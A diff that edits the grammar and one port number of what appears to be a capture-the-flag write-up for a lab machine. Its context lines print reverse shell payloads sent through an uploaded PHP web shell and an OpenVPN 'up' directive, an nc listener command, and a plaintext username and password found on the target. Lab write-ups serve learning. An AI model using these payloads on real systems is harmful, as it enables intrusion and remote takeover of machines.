@@ -120,7 +120,7 @@ GET /sparklays/design/uploads/cmd.php5?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14
 GET /sparklays/design/uploads/cmd.php5?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.8/9001+0>%261'
 ```
 
-After sending the request the listener on my IP and port 9001 starts a reverse shell session as _www-data_.
+After sending the request, the listener on my IP and port 9001 starts a reverse shell session as _www-data_.
 
 ## Privilege Escalation
 
@@ -225,11 +225,11 @@ up "/bin/bash -c '/bin/bash -i > /dev/tcp/192.168.122.1/9002 0<&1 2>&1&'"
 ```
 
 This will build a VPN tunnel from _192.168.122.1_ to _192.168.122.4_ on port 9002.
-So starting a listener on the host via `nc -lvnp 9022` and executing the VPN file by clicking on _"Update File"_ and the listener on the host and port 9002 starts a reverse shell session on _192.168.122.4_ as root.
+So starting a listener on the host via `nc -lvnp 9002` and executing the VPN file by clicking on _"Update File"_ and the listener on the host and port 9002 starts a reverse shell session on _192.168.122.4_ as root.
 
 ### Enumerating 192.168.122.4
 
-There are again the same home folders than before, but only _dave_ has one file in his directory called _ssh_ with some more credentials:
+There are the same home folders as before, but only _dave_ has one file in his directory called _ssh_ with some more credentials:
 ```markdown
 dave
 dav3gerous567
@@ -299,7 +299,7 @@ uid                  david <dave@david.com>
 sub   4096R/D1EB1F03 2018-07-24
 ```
 
-Decoding the key with **Base32**:
+Encoding the key with **Base32**:
 ```markdown
 base32 root.txt.gpg
 ```
